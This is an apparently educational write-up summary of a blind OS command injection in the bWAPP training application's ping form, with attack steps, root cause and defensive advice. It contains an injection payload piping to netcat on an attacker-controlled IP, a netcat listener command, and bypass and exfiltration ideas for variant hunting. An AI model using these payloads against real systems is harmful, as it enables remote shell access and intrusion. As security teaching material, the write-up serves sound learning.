# OS Command Injection on bWAPP - Blind Command Injection Exploitation

## Metadata
- **Source:** writeups.io
- **Date:** 2026-05-22
- **Author:** Various
- **Program:** bWAPP (Buggy Web Application)
- **Bounty:** None - Educational/CTF
- **Severity:** Critical
- **Vuln types:** OS Command Injection, Improper Input Validation, Insufficient Input Sanitization
- **Category:** web-api
- **Writeup:** https://medium.com/@crk2500/os-command-injection-on-bwapp-edbcf6f27224

## Summary
A blind OS command injection vulnerability exists in the bWAPP ping functionality that allows unauthenticated users to execute arbitrary system commands by injecting shell metacharacters into the IP address input field. The vulnerability enables remote code execution on the underlying server, demonstrated through establishing a reverse shell connection to an attacker-controlled machine.

## Attack scenario (step by step)
1. Attacker identifies the OS Command Injection - Blind page in bWAPP
2. Attacker sets up netcat listener on their machine (nc -l -p 4757)
3. Attacker enters malicious payload in the IP address field: '127.0.0.1|nc 192.168.48.133 4757'
4. Application processes input without sanitization, executing the piped command
5. Reverse shell is established, sending command shell access to attacker's netcat listener
6. Attacker gains interactive access to execute arbitrary commands on the server

## Root cause
The application directly passes user-supplied input from the ping form field to a system command execution function (likely exec(), system(), or similar) without proper input validation, sanitization, or escaping. Shell metacharacters (pipes, semicolons, backticks) are not filtered, allowing command chaining.

## Attacker mindset
An attacker would recognize this as a low-hanging fruit vulnerability in a web application's network utility features. The blind injection aspect means the attacker leverages out-of-band techniques (reverse shells, DNS exfiltration) to confirm code execution since output isn't reflected in the response. This is valuable for establishing initial access on compromised infrastructure.

## Defensive takeaways
- Never pass user input directly to system command executors - use parameterized APIs instead
- Implement strict input validation on IP address fields (regex: ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$)
- Use allowlisting rather than blacklisting for command characters
- Run web applications with least privilege principles (non-root user, restricted capabilities)
- Implement shell escape functions appropriate to the language/OS (e.g., escapeshellarg() in PHP)
- Consider using safer alternatives like Net.Ping or ProcessBuilder with array arguments instead of shell invocation
- Deploy WAF rules to detect command injection patterns (pipes, semicolons, command substitution)
- Monitor and alert on unexpected child process spawning from web application processes

## Variant hunting
['Test other network utility features (traceroute, nslookup, dig, whois) for similar injection points', 'Try alternative injection characters: ; && || ` $() backticks and substitution operators', "Attempt time-based blind injection using 'sleep' or 'ping -c 1 -w 1000' to infer execution", 'Test for DNS exfiltration using nslookup with attacker-controlled domain', 'Try encoding/obfuscation bypasses (hex encoding, base64, unicode escaping)', 'Check if output filtering exists by attempting to exfiltrate via FTP, HTTP, or DNS tunneling']

## MITRE ATT&CK
- T1190
- T1059
- T1071
- T1105

## Notes
This is a deliberately vulnerable training application (bWAPP). The 'low' security setting intentionally removes protections. Real-world exploitation would require identifying similar patterns in production applications. The reverse shell technique demonstrates post-exploitation capabilities beyond simple command injection proof-of-concept. Container/VM isolation in the lab environment prevented lateral movement, but would be a concern in production settings. The vulnerability perfectly illustrates why parameterized system calls and input validation are critical security controls.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-05-22*
